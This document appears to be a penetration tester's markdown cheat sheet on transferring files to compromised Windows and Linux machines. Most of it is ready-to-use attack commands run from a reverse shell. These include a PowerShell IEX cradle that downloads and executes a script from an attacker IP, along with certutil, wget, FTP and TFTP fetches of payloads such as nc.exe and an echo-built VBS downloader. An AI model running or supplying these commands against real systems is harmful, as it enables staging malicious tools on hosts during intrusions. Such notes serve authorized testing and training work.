## IEX

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.54:80/Sherlock.ps1')
```

## FTP Tips

 If a binary doesn't work after you've uploaded it to Windows using FTP check if you used binary mode. Error message is something about dos mode: 
 https://security.stackexchange.com/questions/133946/this-program-can-not-be-run-in-dos-mode/133966

## FTP Server

### Install pyftpdlib
```
pip install pyftpdlib
```

### Run (-w flag allows anonymous write access)
```
python -m pyftpdlib -p 21 -w
```

## HTTP

### In Kali
```
python -m SimpleHTTPServer 80
```

## In reverse shell - Linux
```
wget 10.10.10.10/file
```

## In reverse shell - Windows

## Powershell

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
```

## certutil

```
certutil.exe -urlcache -split -f http://example/file.txt file.out
```

## FTP

This process can be mundane, a quick tip would be to be to name the filename as ‘file’ on your kali machine so that you don’t have to re-write the script multiple names, you can then rename the file on windows.

## In Kali
```
python -m pyftpdlib -p 21 -w
```

## In reverse shell
```
echo open 10.10.10.10 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt 
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt
```

## Execute
```
ftp -v -n -s:ftp.txt
```

## TFTP


## In Kali
```
atftpd --daemon --port 69 /tftp
```

## In reverse shell
```
tftp -i 10.10.10.10 GET nc.exe
```

## VBS

When FTP/TFTP fails you, this wget script in VBS was the go to on Windows machines.

## In reverse shell
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

## Execute
```
cscript wget.vbs http://10.10.10.10/file.exe file.exe
```

## Meterpreter

```
upload / download in meterpreter
```

## evil-winrm

```
https://github.com/Hackplayers/evil-winrm

upload/download command
```